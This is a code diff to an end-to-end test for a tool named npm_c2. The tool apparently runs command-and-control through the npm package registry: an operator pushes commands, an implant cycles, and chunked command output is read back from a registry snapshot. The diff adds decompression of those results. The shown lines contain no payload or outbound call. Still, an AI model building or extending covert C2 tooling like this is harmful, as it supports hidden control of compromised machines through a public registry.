@@ -52,7 +52,9 @@ def main():
 
     # 3. operator renders the decoded result
     from npm_c2 import group_chunks
-    rendered = [b.decode(errors="replace") for b, ok in group_chunks(results, npm_c2.RES_PREFIX) if ok]
+    from npm_c2.crypto import decompress
+    rendered = [decompress(b).decode(errors="replace")
+                for b, ok in group_chunks(results, npm_c2.RES_PREFIX) if ok]
     joined = " ".join(rendered)
     step("result decodes to the command output", "e2e-short" in joined, repr(joined[:80]))
 
@@ -61,7 +63,8 @@ def main():
     op.push_task(long_cmd)
     imp._cycle()
     results = reg.snapshot(pkg)
-    rendered = [b.decode(errors="replace") for b, ok in group_chunks(results, npm_c2.RES_PREFIX) if ok]
+    rendered = [decompress(b).decode(errors="replace")
+                for b, ok in group_chunks(results, npm_c2.RES_PREFIX) if ok]
     step("long output reassembles whole", any("C" * 600 in r for r in rendered),
          f"{len(rendered)} complete group(s)")
 
